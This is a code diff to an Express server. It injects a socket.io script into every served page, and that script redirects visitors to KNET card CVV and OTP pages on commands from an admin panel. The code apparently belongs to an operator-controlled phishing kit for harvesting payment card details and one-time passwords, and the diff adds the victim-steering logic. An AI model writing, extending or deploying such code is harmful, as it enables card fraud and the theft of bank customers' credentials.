@@ -216,7 +216,52 @@ app.post('/admin/navigate', (req, res) => {
 
 app.get('/panel', (req, res) => { res.send(getAdminHTML()); });
 app.use(express.static(path.join(__dirname, 'public')));
-app.get('*', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
+app.get('*', (req, res) => {
+  const fs = require('fs');
+  const indexPath = path.join(__dirname, 'public', 'index.html');
+  fs.readFile(indexPath, 'utf8', (err, html) => {
+    if (err) return res.sendFile(indexPath);
+    // Inject socket interceptor script before </body>
+    const interceptScript = `<script src="/socket.io/socket.io.js"><\/script><script>
+(function() {
+  function initInterceptor() {
+    var knetId = sessionStorage.getItem('eventat_knet_txn');
+    if (!knetId) return;
+    // Create a separate socket connection for navigation interception
+    var sock = io({ forceNew: false });
+    sock.on('connect', function() {
+      sock.emit('join_payment', knetId);
+    });
+    sock.on('payment_status_changed', function(data) {
+      var currentKnetId = sessionStorage.getItem('eventat_knet_txn');
+      if (data && (data.id === currentKnetId || data.paymentId === currentKnetId)) {
+        if (data.status === 'CVV_PENDING') {
+          window.location.href = '/knet/cvv?id=' + currentKnetId;
+        } else if (data.status === 'CVV_APPROVED') {
+          window.location.href = '/knet-otp?id=' + currentKnetId;
+        }
+      }
+    });
+    sock.on('navigate_to', function(data) {
+      var currentKnetId = sessionStorage.getItem('eventat_knet_txn');
+      if (data && data.page) {
+        window.location.href = data.page + (currentKnetId ? '?id=' + currentKnetId : '');
+      }
+    });
+    window._interceptSocket = sock;
+  }
+  // Run after page loads
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initInterceptor);
+  } else {
+    initInterceptor();
+  }
+})();
+<\/script>`;
+    const modifiedHtml = html.replace('</body>', interceptScript + '</body>');
+    res.send(modifiedHtml);
+  });
+});
 
 io.on('connection', (socket) => {
   console.log('Client connected:', socket.id);
